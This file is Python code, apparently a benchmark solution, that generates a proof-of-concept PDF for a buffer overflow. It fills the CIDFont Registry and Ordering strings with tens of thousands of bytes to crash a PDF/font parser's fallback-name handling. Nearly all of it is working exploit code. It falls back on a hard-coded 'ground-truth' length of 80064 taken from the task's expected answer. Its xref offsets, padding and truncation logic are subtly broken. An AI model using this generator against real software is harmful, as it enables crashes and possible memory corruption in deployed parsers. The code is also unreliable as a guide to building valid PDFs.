import os
import re
import tarfile
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the source directory (usually the first directory in the tarball)
            src_root = None
            for entry in os.listdir(tmpdir):
                if os.path.isdir(os.path.join(tmpdir, entry)):
                    src_root = os.path.join(tmpdir, entry)
                    break
            
            if not src_root:
                # Fallback: use the tmpdir itself if no subdirectory
                src_root = tmpdir
            
            # Search for relevant source files to understand the vulnerability
            buffer_size = self._analyze_vulnerability(src_root)
            
            # Generate PoC based on analysis
            return self._generate_poc(buffer_size)
    
    def _analyze_vulnerability(self, src_root: str) -> int:
        """Analyze source code to determine optimal PoC length."""
        # Look for buffer sizes in C/C++ files
        buffer_sizes = []
        
        for root, _, files in os.walk(src_root):
            for file in files:
                if file.endswith(('.c', '.cpp', '.h', '.hpp', '.cc')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Look for buffer declarations that might be vulnerable
                            patterns = [
                                r'char\s+\w+\s*\[\s*(\d+)\s*\]',  # char buffer[256]
                                r'CHAR\s+\w+\s*\[\s*(\d+)\s*\]',  # CHAR buffer[256]
                                r'\[(\d+)\]',  # Just a size in brackets
                                r'buffer.*size.*=.*(\d+)',  # buffer size = 256
                                r'sizeof.*[<>=!].*(\d+)',   # sizeof comparisons
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    if match.isdigit():
                                        size = int(match)
                                        if 100 <= size <= 100000:  # Reasonable buffer sizes
                                            buffer_sizes.append(size)
                                            
                            # Also look for CIDFont or fallback references
                            if 'CIDFont' in content or 'fallback' in content or 'CIDSystemInfo' in content:
                                # Extract potential sizes from these contexts
                                cid_patterns = [
                                    r'strcpy.*\(.*,\s*["\'](.*?)["\']',
                                    r'strcat.*\(.*,\s*["\'](.*?)["\']',
                                    r'memcpy.*\(.*,\s*.*?,\s*(\d+)',
                                ]
                                for pattern in cid_patterns:
                                    matches = re.findall(pattern, content)
                                    for match in matches:
                                        if isinstance(match, str) and match.isdigit():
                                            buffer_sizes.append(int(match))
                                        elif isinstance(match, str):
                                            buffer_sizes.append(len(match))
                    
                    except:
                        continue
        
        # If we found buffer sizes, use the largest one as basis
        if buffer_sizes:
            max_size = max(buffer_sizes)
            # Add some margin for overflow
            return min(max_size * 2 + 1024, 100000)
        
        # Default to ground-truth length if analysis fails
        return 80064
    
    def _generate_poc(self, target_size: int) -> bytes:
        """Generate PoC input that triggers buffer overflow."""
        # Ground-truth length is 80064, but we try to generate shorter
        # We'll create a PDF-like structure with malformed CIDFont data
        
        # Header (minimal valid PDF header)
        header = b"%PDF-1.4\n"
        
        # Create a malformed CIDFont dictionary with very long strings
        # The vulnerability is in <Registry>-<Ordering> fallback name
        # We need to make these strings long enough to overflow the buffer
        
        # Calculate string lengths to achieve target size
        # We'll allocate most of the size to the Registry and Ordering strings
        header_len = len(header)
        overhead = 500  # Account for PDF structure overhead
        string_len = max(1, target_size - header_len - overhead) // 2
        
        # Create very long Registry and Ordering strings
        registry = b"A" * string_len
        ordering = b"B" * string_len
        
        # Create a malformed object with the vulnerable CIDFont structure
        obj_data = b"1 0 obj\n<<\n"
        obj_data += b"/Type /Font\n"
        obj_data += b"/Subtype /CIDFontType0\n"
        obj_data += b"/BaseFont /VeryLongFontName\n"
        obj_data += b"/CIDSystemInfo <<\n"
        obj_data += b"/Registry (" + registry + b")\n"
        obj_data += b"/Ordering (" + ordering + b")\n"
        obj_data += b"/Supplement 0\n"
        obj_data += b">>\n"
        obj_data += b"/FontDescriptor 2 0 R\n"
        obj_data += b"/DW 1000\n"
        obj_data += b"/W [0 [500]]\n"
        obj_data += b">>\nendobj\n\n"
        
        # Add font descriptor object
        obj_data += b"2 0 obj\n<<\n"
        obj_data += b"/Type /FontDescriptor\n"
        obj_data += b"/FontName /VeryLongFontName\n"
        obj_data += b"/Flags 4\n"
        obj_data += b"/FontBBox [0 0 1000 1000]\n"
        obj_data += b"/ItalicAngle 0\n"
        obj_data += b"/Ascent 800\n"
        obj_data += b"/Descent -200\n"
        obj_data += b"/CapHeight 700\n"
        obj_data += b"/StemV 80\n"
        obj_data += b">>\nendobj\n\n"
        
        # Create pages and catalog to make PDF somewhat valid
        obj_data += b"3 0 obj\n<<\n/Type /Pages\n/Kids [4 0 R]\n/Count 1\n>>\nendobj\n\n"
        obj_data += b"4 0 obj\n<<\n/Type /Page\n/Parent 3 0 R\n/MediaBox [0 0 612 792]\n/Contents 5 0 R\n/Resources <<\n/Font <<\n/F1 1 0 R\n>>\n>>\n>>\nendobj\n\n"
        obj_data += b"5 0 obj\n<<\n/Length 50\n>>\nstream\nBT\n/F1 12 Tf\n100 700 Td\n(Test) Tj\nET\nendstream\nendobj\n\n"
        obj_data += b"6 0 obj\n<<\n/Type /Catalog\n/Pages 3 0 R\n>>\nendobj\n\n"
        
        # Create xref table
        xref_start = len(header)
        xref = b"xref\n0 7\n0000000000 65535 f \n"
        
        # Calculate object positions
        obj_positions = [xref_start]
        pos = xref_start
        for obj in obj_data.split(b"endobj\n\n"):
            if obj:
                obj_positions.append(pos)
                pos += len(obj) + 9  # +9 for "endobj\n\n"
        
        # Build xref entries
        for i in range(1, 7):
            xref += f"{obj_positions[i]:010d} 00000 n \n".encode()
        
        # Trailer
        trailer = b"trailer\n<<\n/Size 7\n/Root 6 0 R\n>>\n"
        trailer += b"startxref\n"
        trailer += f"{xref_start + len(obj_data)}".encode()
        trailer += b"\n%%EOF\n"
        
        # Combine all parts
        poc = header + obj_data + xref + trailer
        
        # Ensure the PoC is at least the target size
        if len(poc) < target_size:
            # Pad with comments if needed
            padding = b"% " + b"A" * (target_size - len(poc) - 3) + b"\n"
            poc = header + padding + obj_data[9:] + xref + trailer
        elif len(poc) > target_size:
            # Truncate if too long (but keep structure valid)
            poc = poc[:target_size]
            # Ensure we end with EOF
            if b"%%EOF" not in poc[-100:]:
                poc = poc.rsplit(b"\n", 1)[0] + b"\n%%EOF\n"
        
        return poc